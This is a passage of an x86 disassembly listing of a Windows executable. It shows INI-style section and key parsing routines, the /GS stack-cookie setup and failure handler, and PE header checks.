 1005e4c:	85 c0                	test   %eax,%eax
 1005e4e:	a1 c8 c8 00 01       	mov    0x100c8c8,%eax
 1005e53:	75 07                	jne    0x1005e5c
 1005e55:	0b c6                	or     %esi,%eax
 1005e57:	a3 c8 c8 00 01       	mov    %eax,0x100c8c8
 1005e5c:	85 c6                	test   %eax,%esi
 1005e5e:	74 0a                	je     0x1005e6a
 1005e60:	68 07 00 00 20       	push   $0x20000007
 1005e65:	e8 28 da ff ff       	call   0x1003892
 1005e6a:	39 1d 60 c0 00 01    	cmp    %ebx,0x100c060
 1005e70:	74 11                	je     0x1005e83
 1005e72:	68 60 d0 00 01       	push   $0x100d060
 1005e77:	ff 15 2c 21 00 01    	call   *0x100212c
 1005e7d:	89 1d 60 c0 00 01    	mov    %ebx,0x100c060
 1005e83:	ff 75 fc             	push   -0x4(%ebp)
 1005e86:	ff 15 28 21 00 01    	call   *0x1002128
 1005e8c:	cc                   	int3
 1005e8d:	cc                   	int3
 1005e8e:	cc                   	int3
 1005e8f:	cc                   	int3
 1005e90:	cc                   	int3
 1005e91:	cc                   	int3
 1005e92:	e9 02 fa ff ff       	jmp    0x1005899
 1005e97:	cc                   	int3
 1005e98:	cc                   	int3
 1005e99:	cc                   	int3
 1005e9a:	cc                   	int3
 1005e9b:	cc                   	int3
 1005e9c:	8b ff                	mov    %edi,%edi
 1005e9e:	55                   	push   %ebp
 1005e9f:	8b ec                	mov    %esp,%ebp
 1005ea1:	8b 45 08             	mov    0x8(%ebp),%eax
 1005ea4:	eb 17                	jmp    0x1005ebd
 1005ea6:	80 f9 3b             	cmp    $0x3b,%cl
 1005ea9:	75 0c                	jne    0x1005eb7
 1005eab:	84 c9                	test   %cl,%cl
 1005ead:	74 14                	je     0x1005ec3
 1005eaf:	40                   	inc    %eax
 1005eb0:	8a 08                	mov    (%eax),%cl
 1005eb2:	80 f9 0a             	cmp    $0xa,%cl
 1005eb5:	75 f4                	jne    0x1005eab
 1005eb7:	80 38 20             	cmpb   $0x20,(%eax)
 1005eba:	7f 09                	jg     0x1005ec5
 1005ebc:	40                   	inc    %eax
 1005ebd:	8a 08                	mov    (%eax),%cl
 1005ebf:	84 c9                	test   %cl,%cl
 1005ec1:	75 e3                	jne    0x1005ea6
 1005ec3:	33 c0                	xor    %eax,%eax
 1005ec5:	5d                   	pop    %ebp
 1005ec6:	c2 04 00             	ret    $0x4
 1005ec9:	cc                   	int3
 1005eca:	cc                   	int3
 1005ecb:	cc                   	int3
 1005ecc:	cc                   	int3
 1005ecd:	cc                   	int3
 1005ece:	8b ff                	mov    %edi,%edi
 1005ed0:	55                   	push   %ebp
 1005ed1:	8b ec                	mov    %esp,%ebp
 1005ed3:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1005ed6:	eb 05                	jmp    0x1005edd
 1005ed8:	84 c0                	test   %al,%al
 1005eda:	74 12                	je     0x1005eee
 1005edc:	41                   	inc    %ecx
 1005edd:	8a 01                	mov    (%ecx),%al
 1005edf:	3c 0a                	cmp    $0xa,%al
 1005ee1:	75 f5                	jne    0x1005ed8
 1005ee3:	41                   	inc    %ecx
 1005ee4:	51                   	push   %ecx
 1005ee5:	e8 b2 ff ff ff       	call   0x1005e9c
 1005eea:	5d                   	pop    %ebp
 1005eeb:	c2 04 00             	ret    $0x4
 1005eee:	33 c0                	xor    %eax,%eax
 1005ef0:	eb f8                	jmp    0x1005eea
 1005ef2:	cc                   	int3
 1005ef3:	cc                   	int3
 1005ef4:	cc                   	int3
 1005ef5:	cc                   	int3
 1005ef6:	cc                   	int3
 1005ef7:	8b ff                	mov    %edi,%edi
 1005ef9:	55                   	push   %ebp
 1005efa:	8b ec                	mov    %esp,%ebp
 1005efc:	53                   	push   %ebx
 1005efd:	8b 5d 0c             	mov    0xc(%ebp),%ebx
 1005f00:	56                   	push   %esi
 1005f01:	8b 75 08             	mov    0x8(%ebp),%esi
 1005f04:	57                   	push   %edi
 1005f05:	c6 03 00             	movb   $0x0,(%ebx)
 1005f08:	eb 0c                	jmp    0x1005f16
 1005f0a:	56                   	push   %esi
 1005f0b:	e8 be ff ff ff       	call   0x1005ece
 1005f10:	8b f0                	mov    %eax,%esi
 1005f12:	85 f6                	test   %esi,%esi
 1005f14:	74 2c                	je     0x1005f42
 1005f16:	80 3e 5b             	cmpb   $0x5b,(%esi)
 1005f19:	75 ef                	jne    0x1005f0a
 1005f1b:	8d 46 01             	lea    0x1(%esi),%eax
 1005f1e:	eb 0a                	jmp    0x1005f2a
 1005f20:	84 c9                	test   %cl,%cl
 1005f22:	74 1e                	je     0x1005f42
 1005f24:	80 f9 20             	cmp    $0x20,%cl
 1005f27:	7e 0a                	jle    0x1005f33
 1005f29:	40                   	inc    %eax
 1005f2a:	8a 08                	mov    (%eax),%cl
 1005f2c:	80 f9 5d             	cmp    $0x5d,%cl
 1005f2f:	75 ef                	jne    0x1005f20
 1005f31:	eb 03                	jmp    0x1005f36
 1005f33:	8d 70 ff             	lea    -0x1(%eax),%esi
 1005f36:	2b c6                	sub    %esi,%eax
 1005f38:	48                   	dec    %eax
 1005f39:	8b f8                	mov    %eax,%edi
 1005f3b:	74 d9                	je     0x1005f16
 1005f3d:	39 7d 10             	cmp    %edi,0x10(%ebp)
 1005f40:	77 04                	ja     0x1005f46
 1005f42:	33 c0                	xor    %eax,%eax
 1005f44:	eb 1c                	jmp    0x1005f62
 1005f46:	57                   	push   %edi
 1005f47:	8d 46 01             	lea    0x1(%esi),%eax
 1005f4a:	50                   	push   %eax
 1005f4b:	53                   	push   %ebx
 1005f4c:	ff 15 b0 21 00 01    	call   *0x10021b0
 1005f52:	53                   	push   %ebx
 1005f53:	c6 04 1f 00          	movb   $0x0,(%edi,%ebx,1)
 1005f57:	ff 15 b8 21 00 01    	call   *0x10021b8
 1005f5d:	83 c4 10             	add    $0x10,%esp
 1005f60:	8b c6                	mov    %esi,%eax
 1005f62:	5f                   	pop    %edi
 1005f63:	5e                   	pop    %esi
 1005f64:	5b                   	pop    %ebx
 1005f65:	5d                   	pop    %ebp
 1005f66:	c2 0c 00             	ret    $0xc
 1005f69:	cc                   	int3
 1005f6a:	cc                   	int3
 1005f6b:	cc                   	int3
 1005f6c:	cc                   	int3
 1005f6d:	cc                   	int3
 1005f6e:	8b ff                	mov    %edi,%edi
 1005f70:	55                   	push   %ebp
 1005f71:	8b ec                	mov    %esp,%ebp
 1005f73:	8b 45 08             	mov    0x8(%ebp),%eax
 1005f76:	80 38 5b             	cmpb   $0x5b,(%eax)
 1005f79:	75 01                	jne    0x1005f7c
 1005f7b:	40                   	inc    %eax
 1005f7c:	ff 75 10             	push   0x10(%ebp)
 1005f7f:	ff 75 0c             	push   0xc(%ebp)
 1005f82:	50                   	push   %eax
 1005f83:	e8 6f ff ff ff       	call   0x1005ef7
 1005f88:	5d                   	pop    %ebp
 1005f89:	c2 0c 00             	ret    $0xc
 1005f8c:	cc                   	int3
 1005f8d:	cc                   	int3
 1005f8e:	cc                   	int3
 1005f8f:	cc                   	int3
 1005f90:	cc                   	int3
 1005f91:	8b ff                	mov    %edi,%edi
 1005f93:	55                   	push   %ebp
 1005f94:	8b ec                	mov    %esp,%ebp
 1005f96:	83 ec 68             	sub    $0x68,%esp
 1005f99:	a1 28 c0 00 01       	mov    0x100c028,%eax
 1005f9e:	57                   	push   %edi
 1005f9f:	6a 64                	push   $0x64
 1005fa1:	8d 4d 98             	lea    -0x68(%ebp),%ecx
 1005fa4:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1005fa7:	8b 45 08             	mov    0x8(%ebp),%eax
 1005faa:	51                   	push   %ecx
 1005fab:	50                   	push   %eax
 1005fac:	e8 46 ff ff ff       	call   0x1005ef7
 1005fb1:	8b f8                	mov    %eax,%edi
 1005fb3:	85 ff                	test   %edi,%edi
 1005fb5:	74 45                	je     0x1005ffc
 1005fb7:	56                   	push   %esi
 1005fb8:	8b 75 0c             	mov    0xc(%ebp),%esi
 1005fbb:	8d 4d 98             	lea    -0x68(%ebp),%ecx
 1005fbe:	8a 06                	mov    (%esi),%al
 1005fc0:	8a d0                	mov    %al,%dl
 1005fc2:	3a 01                	cmp    (%ecx),%al
 1005fc4:	75 1a                	jne    0x1005fe0
 1005fc6:	84 d2                	test   %dl,%dl
 1005fc8:	74 12                	je     0x1005fdc
 1005fca:	8a 46 01             	mov    0x1(%esi),%al
 1005fcd:	8a d0                	mov    %al,%dl
 1005fcf:	3a 41 01             	cmp    0x1(%ecx),%al
 1005fd2:	75 0c                	jne    0x1005fe0
 1005fd4:	46                   	inc    %esi
 1005fd5:	46                   	inc    %esi
 1005fd6:	41                   	inc    %ecx
 1005fd7:	41                   	inc    %ecx
 1005fd8:	84 d2                	test   %dl,%dl
 1005fda:	75 e2                	jne    0x1005fbe
 1005fdc:	33 c9                	xor    %ecx,%ecx
 1005fde:	eb 05                	jmp    0x1005fe5
 1005fe0:	1b c9                	sbb    %ecx,%ecx
 1005fe2:	83 d9 ff             	sbb    $0xffffffff,%ecx
 1005fe5:	85 c9                	test   %ecx,%ecx
 1005fe7:	74 12                	je     0x1005ffb
 1005fe9:	6a 64                	push   $0x64
 1005feb:	8d 45 98             	lea    -0x68(%ebp),%eax
 1005fee:	50                   	push   %eax
 1005fef:	57                   	push   %edi
 1005ff0:	e8 79 ff ff ff       	call   0x1005f6e
 1005ff5:	8b f8                	mov    %eax,%edi
 1005ff7:	85 ff                	test   %edi,%edi
 1005ff9:	75 bd                	jne    0x1005fb8
 1005ffb:	5e                   	pop    %esi
 1005ffc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1005fff:	8b c7                	mov    %edi,%eax
 1006001:	5f                   	pop    %edi
 1006002:	e8 f8 02 00 00       	call   0x10062ff
 1006007:	c9                   	leave
 1006008:	c2 08 00             	ret    $0x8
 100600b:	cc                   	int3
 100600c:	cc                   	int3
 100600d:	cc                   	int3
 100600e:	cc                   	int3
 100600f:	cc                   	int3
 1006010:	8b ff                	mov    %edi,%edi
 1006012:	55                   	push   %ebp
 1006013:	8b ec                	mov    %esp,%ebp
 1006015:	83 ec 68             	sub    $0x68,%esp
 1006018:	a1 28 c0 00 01       	mov    0x100c028,%eax
 100601d:	57                   	push   %edi
 100601e:	6a 64                	push   $0x64
 1006020:	8d 4d 98             	lea    -0x68(%ebp),%ecx
 1006023:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1006026:	8b 45 08             	mov    0x8(%ebp),%eax
 1006029:	51                   	push   %ecx
 100602a:	50                   	push   %eax
 100602b:	e8 3e ff ff ff       	call   0x1005f6e
 1006030:	8b f8                	mov    %eax,%edi
 1006032:	85 ff                	test   %edi,%edi
 1006034:	74 45                	je     0x100607b
 1006036:	56                   	push   %esi
 1006037:	8b 75 0c             	mov    0xc(%ebp),%esi
 100603a:	8d 4d 98             	lea    -0x68(%ebp),%ecx
 100603d:	8a 06                	mov    (%esi),%al
 100603f:	8a d0                	mov    %al,%dl
 1006041:	3a 01                	cmp    (%ecx),%al
 1006043:	75 1a                	jne    0x100605f
 1006045:	84 d2                	test   %dl,%dl
 1006047:	74 12                	je     0x100605b
 1006049:	8a 46 01             	mov    0x1(%esi),%al
 100604c:	8a d0                	mov    %al,%dl
 100604e:	3a 41 01             	cmp    0x1(%ecx),%al
 1006051:	75 0c                	jne    0x100605f
 1006053:	46                   	inc    %esi
 1006054:	46                   	inc    %esi
 1006055:	41                   	inc    %ecx
 1006056:	41                   	inc    %ecx
 1006057:	84 d2                	test   %dl,%dl
 1006059:	75 e2                	jne    0x100603d
 100605b:	33 c9                	xor    %ecx,%ecx
 100605d:	eb 05                	jmp    0x1006064
 100605f:	1b c9                	sbb    %ecx,%ecx
 1006061:	83 d9 ff             	sbb    $0xffffffff,%ecx
 1006064:	85 c9                	test   %ecx,%ecx
 1006066:	74 12                	je     0x100607a
 1006068:	6a 64                	push   $0x64
 100606a:	8d 45 98             	lea    -0x68(%ebp),%eax
 100606d:	50                   	push   %eax
 100606e:	57                   	push   %edi
 100606f:	e8 fa fe ff ff       	call   0x1005f6e
 1006074:	8b f8                	mov    %eax,%edi
 1006076:	85 ff                	test   %edi,%edi
 1006078:	75 bd                	jne    0x1006037
 100607a:	5e                   	pop    %esi
 100607b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 100607e:	8b c7                	mov    %edi,%eax
 1006080:	5f                   	pop    %edi
 1006081:	e8 79 02 00 00       	call   0x10062ff
 1006086:	c9                   	leave
 1006087:	c2 08 00             	ret    $0x8
 100608a:	cc                   	int3
 100608b:	cc                   	int3
 100608c:	cc                   	int3
 100608d:	cc                   	int3
 100608e:	cc                   	int3
 100608f:	8b ff                	mov    %edi,%edi
 1006091:	55                   	push   %ebp
 1006092:	8b ec                	mov    %esp,%ebp
 1006094:	8b 45 08             	mov    0x8(%ebp),%eax
 1006097:	50                   	push   %eax
 1006098:	8b d0                	mov    %eax,%edx
 100609a:	e8 2f fe ff ff       	call   0x1005ece
 100609f:	85 c0                	test   %eax,%eax
 10060a1:	74 12                	je     0x10060b5
 10060a3:	80 38 5b             	cmpb   $0x5b,(%eax)
 10060a6:	75 0d                	jne    0x10060b5
 10060a8:	ff 75 0c             	push   0xc(%ebp)
 10060ab:	52                   	push   %edx
 10060ac:	e8 5f ff ff ff       	call   0x1006010
 10060b1:	85 c0                	test   %eax,%eax
 10060b3:	75 e2                	jne    0x1006097
 10060b5:	5d                   	pop    %ebp
 10060b6:	c2 08 00             	ret    $0x8
 10060b9:	cc                   	int3
 10060ba:	cc                   	int3
 10060bb:	cc                   	int3
 10060bc:	cc                   	int3
 10060bd:	cc                   	int3
 10060be:	8b ff                	mov    %edi,%edi
 10060c0:	55                   	push   %ebp
 10060c1:	8b ec                	mov    %esp,%ebp
 10060c3:	53                   	push   %ebx
 10060c4:	57                   	push   %edi
 10060c5:	33 db                	xor    %ebx,%ebx
 10060c7:	33 ff                	xor    %edi,%edi
 10060c9:	83 7d 14 01          	cmpl   $0x1,0x14(%ebp)
 10060cd:	73 07                	jae    0x10060d6
 10060cf:	33 c0                	xor    %eax,%eax
 10060d1:	e9 ac 00 00 00       	jmp    0x1006182
 10060d6:	8b 45 10             	mov    0x10(%ebp),%eax
 10060d9:	56                   	push   %esi
 10060da:	8b 75 08             	mov    0x8(%ebp),%esi
 10060dd:	8a 0e                	mov    (%esi),%cl
 10060df:	84 c9                	test   %cl,%cl
 10060e1:	0f 84 98 00 00 00    	je     0x100617f
 10060e7:	80 f9 0a             	cmp    $0xa,%cl
 10060ea:	0f 84 8f 00 00 00    	je     0x100617f
 10060f0:	80 f9 3b             	cmp    $0x3b,%cl
 10060f3:	0f 84 86 00 00 00    	je     0x100617f
 10060f9:	80 f9 22             	cmp    $0x22,%cl
 10060fc:	74 1b                	je     0x1006119
 10060fe:	80 f9 3d             	cmp    $0x3d,%cl
 1006101:	74 0c                	je     0x100610f
 1006103:	80 f9 2c             	cmp    $0x2c,%cl
 1006106:	74 07                	je     0x100610f
 1006108:	80 f9 20             	cmp    $0x20,%cl
 100610b:	7f 10                	jg     0x100611d
 100610d:	eb 01                	jmp    0x1006110
 100610f:	47                   	inc    %edi
 1006110:	46                   	inc    %esi
 1006111:	8a 0e                	mov    (%esi),%cl
 1006113:	84 c9                	test   %cl,%cl
 1006115:	75 d0                	jne    0x10060e7
 1006117:	eb 04                	jmp    0x100611d
 1006119:	33 db                	xor    %ebx,%ebx
 100611b:	43                   	inc    %ebx
 100611c:	46                   	inc    %esi
 100611d:	8a 0e                	mov    (%esi),%cl
 100611f:	84 c9                	test   %cl,%cl
 1006121:	74 5c                	je     0x100617f
 1006123:	3b 7d 0c             	cmp    0xc(%ebp),%edi
 1006126:	77 57                	ja     0x100617f
 1006128:	33 d2                	xor    %edx,%edx
 100612a:	85 db                	test   %ebx,%ebx
 100612c:	74 0e                	je     0x100613c
 100612e:	80 f9 22             	cmp    $0x22,%cl
 1006131:	74 05                	je     0x1006138
 1006133:	80 f9 0a             	cmp    $0xa,%cl
 1006136:	75 1d                	jne    0x1006155
 1006138:	33 db                	xor    %ebx,%ebx
 100613a:	eb 1d                	jmp    0x1006159
 100613c:	80 f9 0a             	cmp    $0xa,%cl
 100613f:	74 24                	je     0x1006165
 1006141:	80 f9 2c             	cmp    $0x2c,%cl
 1006144:	74 1f                	je     0x1006165
 1006146:	80 f9 3b             	cmp    $0x3b,%cl
 1006149:	74 1a                	je     0x1006165
 100614b:	80 f9 3d             	cmp    $0x3d,%cl
 100614e:	74 1a                	je     0x100616a
 1006150:	80 f9 20             	cmp    $0x20,%cl
 1006153:	7e 04                	jle    0x1006159
 1006155:	88 0c 02             	mov    %cl,(%edx,%eax,1)
 1006158:	42                   	inc    %edx
 1006159:	3b 55 14             	cmp    0x14(%ebp),%edx
 100615c:	73 21                	jae    0x100617f
 100615e:	46                   	inc    %esi
 100615f:	8a 0e                	mov    (%esi),%cl
 1006161:	84 c9                	test   %cl,%cl
 1006163:	75 c5                	jne    0x100612a
 1006165:	85 ff                	test   %edi,%edi
 1006167:	75 01                	jne    0x100616a
 1006169:	47                   	inc    %edi
 100616a:	39 7d 0c             	cmp    %edi,0xc(%ebp)
 100616d:	0f 87 6a ff ff ff    	ja     0x10060dd
 1006173:	75 0a                	jne    0x100617f
 1006175:	85 d2                	test   %edx,%edx
 1006177:	76 06                	jbe    0x100617f
 1006179:	c6 04 02 00          	movb   $0x0,(%edx,%eax,1)
 100617d:	eb 02                	jmp    0x1006181
 100617f:	33 c0                	xor    %eax,%eax
 1006181:	5e                   	pop    %esi
 1006182:	5f                   	pop    %edi
 1006183:	5b                   	pop    %ebx
 1006184:	5d                   	pop    %ebp
 1006185:	c2 10 00             	ret    $0x10
 1006188:	cc                   	int3
 1006189:	cc                   	int3
 100618a:	cc                   	int3
 100618b:	cc                   	int3
 100618c:	cc                   	int3
 100618d:	8b ff                	mov    %edi,%edi
 100618f:	55                   	push   %ebp
 1006190:	8b ec                	mov    %esp,%ebp
 1006192:	33 d2                	xor    %edx,%edx
 1006194:	83 7d 10 01          	cmpl   $0x1,0x10(%ebp)
 1006198:	73 04                	jae    0x100619e
 100619a:	33 c0                	xor    %eax,%eax
 100619c:	eb 28                	jmp    0x10061c6
 100619e:	8b 45 0c             	mov    0xc(%ebp),%eax
 10061a1:	56                   	push   %esi
 10061a2:	8b 75 08             	mov    0x8(%ebp),%esi
 10061a5:	eb 14                	jmp    0x10061bb
 10061a7:	80 f9 0a             	cmp    $0xa,%cl
 10061aa:	74 15                	je     0x10061c1
 10061ac:	80 f9 0d             	cmp    $0xd,%cl
 10061af:	74 09                	je     0x10061ba
 10061b1:	88 0c 02             	mov    %cl,(%edx,%eax,1)
 10061b4:	42                   	inc    %edx
 10061b5:	3b 55 10             	cmp    0x10(%ebp),%edx
 10061b8:	73 10                	jae    0x10061ca
 10061ba:	46                   	inc    %esi
 10061bb:	8a 0e                	mov    (%esi),%cl
 10061bd:	84 c9                	test   %cl,%cl
 10061bf:	75 e6                	jne    0x10061a7
 10061c1:	c6 04 02 00          	movb   $0x0,(%edx,%eax,1)
 10061c5:	5e                   	pop    %esi
 10061c6:	5d                   	pop    %ebp
 10061c7:	c2 0c 00             	ret    $0xc
 10061ca:	33 c0                	xor    %eax,%eax
 10061cc:	eb f7                	jmp    0x10061c5
 10061ce:	cc                   	int3
 10061cf:	cc                   	int3
 10061d0:	cc                   	int3
 10061d1:	cc                   	int3
 10061d2:	cc                   	int3
 10061d3:	8b ff                	mov    %edi,%edi
 10061d5:	55                   	push   %ebp
 10061d6:	8b ec                	mov    %esp,%ebp
 10061d8:	ff 75 0c             	push   0xc(%ebp)
 10061db:	ff 75 08             	push   0x8(%ebp)
 10061de:	e8 ae fd ff ff       	call   0x1005f91
 10061e3:	85 c0                	test   %eax,%eax
 10061e5:	74 09                	je     0x10061f0
 10061e7:	ff 75 0c             	push   0xc(%ebp)
 10061ea:	50                   	push   %eax
 10061eb:	e8 9f fe ff ff       	call   0x100608f
 10061f0:	5d                   	pop    %ebp
 10061f1:	c2 08 00             	ret    $0x8
 10061f4:	cc                   	int3
 10061f5:	cc                   	int3
 10061f6:	cc                   	int3
 10061f7:	cc                   	int3
 10061f8:	cc                   	int3
 10061f9:	8b ff                	mov    %edi,%edi
 10061fb:	55                   	push   %ebp
 10061fc:	8b ec                	mov    %esp,%ebp
 10061fe:	83 ec 38             	sub    $0x38,%esp
 1006201:	a1 28 c0 00 01       	mov    0x100c028,%eax
 1006206:	53                   	push   %ebx
 1006207:	8b 5d 0c             	mov    0xc(%ebp),%ebx
 100620a:	56                   	push   %esi
 100620b:	57                   	push   %edi
 100620c:	89 45 fc             	mov    %eax,-0x4(%ebp)
 100620f:	8b 45 08             	mov    0x8(%ebp),%eax
 1006212:	53                   	push   %ebx
 1006213:	50                   	push   %eax
 1006214:	e8 ba ff ff ff       	call   0x10061d3
 1006219:	eb 55                	jmp    0x1006270
 100621b:	6a 32                	push   $0x32
 100621d:	8d 45 c8             	lea    -0x38(%ebp),%eax
 1006220:	50                   	push   %eax
 1006221:	6a 00                	push   $0x0
 1006223:	57                   	push   %edi
 1006224:	e8 95 fe ff ff       	call   0x10060be
 1006229:	85 c0                	test   %eax,%eax
 100622b:	74 3c                	je     0x1006269
 100622d:	8d 45 c8             	lea    -0x38(%ebp),%eax
 1006230:	50                   	push   %eax
 1006231:	ff 15 b8 21 00 01    	call   *0x10021b8
 1006237:	8b 75 10             	mov    0x10(%ebp),%esi
 100623a:	59                   	pop    %ecx
 100623b:	8d 45 c8             	lea    -0x38(%ebp),%eax
 100623e:	8a 10                	mov    (%eax),%dl
 1006240:	8a ca                	mov    %dl,%cl
 1006242:	3a 16                	cmp    (%esi),%dl
 1006244:	75 1a                	jne    0x1006260
 1006246:	84 c9                	test   %cl,%cl
 1006248:	74 12                	je     0x100625c
 100624a:	8a 50 01             	mov    0x1(%eax),%dl
 100624d:	8a ca                	mov    %dl,%cl
 100624f:	3a 56 01             	cmp    0x1(%esi),%dl
 1006252:	75 0c                	jne    0x1006260
 1006254:	40                   	inc    %eax
 1006255:	40                   	inc    %eax
 1006256:	46                   	inc    %esi
 1006257:	46                   	inc    %esi
 1006258:	84 c9                	test   %cl,%cl
 100625a:	75 e2                	jne    0x100623e
 100625c:	33 c0                	xor    %eax,%eax
 100625e:	eb 05                	jmp    0x1006265
 1006260:	1b c0                	sbb    %eax,%eax
 1006262:	83 d8 ff             	sbb    $0xffffffff,%eax
 1006265:	85 c0                	test   %eax,%eax
 1006267:	74 0d                	je     0x1006276
 1006269:	53                   	push   %ebx
 100626a:	57                   	push   %edi
 100626b:	e8 1f fe ff ff       	call   0x100608f
 1006270:	8b f8                	mov    %eax,%edi
 1006272:	85 ff                	test   %edi,%edi
 1006274:	75 a5                	jne    0x100621b
 1006276:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1006279:	8b c7                	mov    %edi,%eax
 100627b:	5f                   	pop    %edi
 100627c:	5e                   	pop    %esi
 100627d:	5b                   	pop    %ebx
 100627e:	e8 7c 00 00 00       	call   0x10062ff
 1006283:	c9                   	leave
 1006284:	c2 0c 00             	ret    $0xc
 1006287:	cc                   	int3
 1006288:	cc                   	int3
 1006289:	cc                   	int3
 100628a:	cc                   	int3
 100628b:	cc                   	int3
 100628c:	8b ff                	mov    %edi,%edi
 100628e:	55                   	push   %ebp
 100628f:	8b ec                	mov    %esp,%ebp
 1006291:	83 ec 10             	sub    $0x10,%esp
 1006294:	a1 28 c0 00 01       	mov    0x100c028,%eax
 1006299:	85 c0                	test   %eax,%eax
 100629b:	74 07                	je     0x10062a4
 100629d:	3d 40 bb 00 00       	cmp    $0xbb40,%eax
 10062a2:	75 4d                	jne    0x10062f1
 10062a4:	56                   	push   %esi
 10062a5:	8d 45 f8             	lea    -0x8(%ebp),%eax
 10062a8:	50                   	push   %eax
 10062a9:	ff 15 7c 20 00 01    	call   *0x100207c
 10062af:	8b 75 fc             	mov    -0x4(%ebp),%esi
 10062b2:	33 75 f8             	xor    -0x8(%ebp),%esi
 10062b5:	ff 15 78 20 00 01    	call   *0x1002078
 10062bb:	33 f0                	xor    %eax,%esi
 10062bd:	ff 15 74 20 00 01    	call   *0x1002074
 10062c3:	33 f0                	xor    %eax,%esi
 10062c5:	ff 15 bc 20 00 01    	call   *0x10020bc
 10062cb:	33 f0                	xor    %eax,%esi
 10062cd:	8d 45 f0             	lea    -0x10(%ebp),%eax
 10062d0:	50                   	push   %eax
 10062d1:	ff 15 70 20 00 01    	call   *0x1002070
 10062d7:	8b 45 f4             	mov    -0xc(%ebp),%eax
 10062da:	33 45 f0             	xor    -0x10(%ebp),%eax
 10062dd:	33 c6                	xor    %esi,%eax
 10062df:	25 ff ff 00 00       	and    $0xffff,%eax
 10062e4:	5e                   	pop    %esi
 10062e5:	75 05                	jne    0x10062ec
 10062e7:	b8 40 bb 00 00       	mov    $0xbb40,%eax
 10062ec:	a3 28 c0 00 01       	mov    %eax,0x100c028
 10062f1:	f7 d0                	not    %eax
 10062f3:	a3 24 c0 00 01       	mov    %eax,0x100c024
 10062f8:	c9                   	leave
 10062f9:	c3                   	ret
 10062fa:	cc                   	int3
 10062fb:	cc                   	int3
 10062fc:	cc                   	int3
 10062fd:	cc                   	int3
 10062fe:	cc                   	int3
 10062ff:	3b 0d 28 c0 00 01    	cmp    0x100c028,%ecx
 1006305:	75 09                	jne    0x1006310
 1006307:	f7 c1 00 00 ff ff    	test   $0xffff0000,%ecx
 100630d:	75 01                	jne    0x1006310
 100630f:	c3                   	ret
 1006310:	e9 05 00 00 00       	jmp    0x100631a
 1006315:	cc                   	int3
 1006316:	cc                   	int3
 1006317:	cc                   	int3
 1006318:	cc                   	int3
 1006319:	cc                   	int3
 100631a:	8b ff                	mov    %edi,%edi
 100631c:	55                   	push   %ebp
 100631d:	8b ec                	mov    %esp,%ebp
 100631f:	81 ec 20 03 00 00    	sub    $0x320,%esp
 1006325:	57                   	push   %edi
 1006326:	a3 68 c1 00 01       	mov    %eax,0x100c168
 100632b:	89 0d 64 c1 00 01    	mov    %ecx,0x100c164
 1006331:	89 15 60 c1 00 01    	mov    %edx,0x100c160
 1006337:	89 1d 5c c1 00 01    	mov    %ebx,0x100c15c
 100633d:	89 35 58 c1 00 01    	mov    %esi,0x100c158
 1006343:	89 3d 54 c1 00 01    	mov    %edi,0x100c154
 1006349:	66 8c 15 80 c1 00 01 	data16 mov %ss,0x100c180
 1006350:	66 8c 0d 74 c1 00 01 	data16 mov %cs,0x100c174
 1006357:	66 8c 1d 50 c1 00 01 	data16 mov %ds,0x100c150
 100635e:	66 8c 05 4c c1 00 01 	data16 mov %es,0x100c14c
 1006365:	66 8c 25 48 c1 00 01 	data16 mov %fs,0x100c148
 100636c:	66 8c 2d 44 c1 00 01 	data16 mov %gs,0x100c144
 1006373:	9c                   	pushf
 1006374:	8f 05 78 c1 00 01    	pop    0x100c178
 100637a:	8b 45 04             	mov    0x4(%ebp),%eax
 100637d:	8d 4d 04             	lea    0x4(%ebp),%ecx
 1006380:	83 c1 04             	add    $0x4,%ecx
 1006383:	89 0d 7c c1 00 01    	mov    %ecx,0x100c17c
 1006389:	a3 70 c1 00 01       	mov    %eax,0x100c170
 100638e:	c7 05 b8 c0 00 01 01 	movl   $0x10001,0x100c0b8
 1006395:	00 01 00 
 1006398:	8d 4d 04             	lea    0x4(%ebp),%ecx
 100639b:	8b 49 fc             	mov    -0x4(%ecx),%ecx
 100639e:	a3 74 c0 00 01       	mov    %eax,0x100c074
 10063a3:	a1 28 c0 00 01       	mov    0x100c028,%eax
 10063a8:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10063ab:	a1 24 c0 00 01       	mov    0x100c024,%eax
 10063b0:	33 ff                	xor    %edi,%edi
 10063b2:	47                   	inc    %edi
 10063b3:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10063b6:	6a 00                	push   $0x0
 10063b8:	89 0d 6c c1 00 01    	mov    %ecx,0x100c16c
 10063be:	c7 05 68 c0 00 01 09 	movl   $0xc0000409,0x100c068
 10063c5:	04 00 c0 
 10063c8:	89 3d 6c c0 00 01    	mov    %edi,0x100c06c
 10063ce:	ff 15 84 20 00 01    	call   *0x1002084
 10063d4:	68 d8 25 00 01       	push   $0x10025d8
 10063d9:	ff 15 80 20 00 01    	call   *0x1002080
 10063df:	68 09 04 00 c0       	push   $0xc0000409
 10063e4:	89 bd e0 fc ff ff    	mov    %edi,-0x320(%ebp)
 10063ea:	ff 15 3c 21 00 01    	call   *0x100213c
 10063f0:	50                   	push   %eax
 10063f1:	ff 15 f8 20 00 01    	call   *0x10020f8
 10063f7:	5f                   	pop    %edi
 10063f8:	c9                   	leave
 10063f9:	c3                   	ret
 10063fa:	cc                   	int3
 10063fb:	cc                   	int3
 10063fc:	cc                   	int3
 10063fd:	cc                   	int3
 10063fe:	cc                   	int3
 10063ff:	e9 5a f7 ff ff       	jmp    0x1005b5e
 1006404:	00 01                	add    %al,(%ecx)
 1006406:	e8 ad 01 00 00       	call   0x10065b8
 100640b:	66 81 3d 00 00 00 01 	cmpw   $0x5a4d,0x1000000
 1006412:	4d 5a 
 1006414:	75 28                	jne    0x100643e
 1006416:	a1 3c 00 00 01       	mov    0x100003c,%eax
 100641b:	81 b8 00 00 00 01 50 	cmpl   $0x4550,0x1000000(%eax)
 1006422:	45 00 00 
 1006425:	75 17                	jne    0x100643e
 1006427:	0f b7 88 18 00 00 01 	movzwl 0x1000018(%eax),%ecx
 100642e:	81 f9 0b 01 00 00    	cmp    $0x10b,%ecx
 1006434:	74 21                	je     0x1006457
 1006436:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
 100643c:	74 06                	je     0x1006444
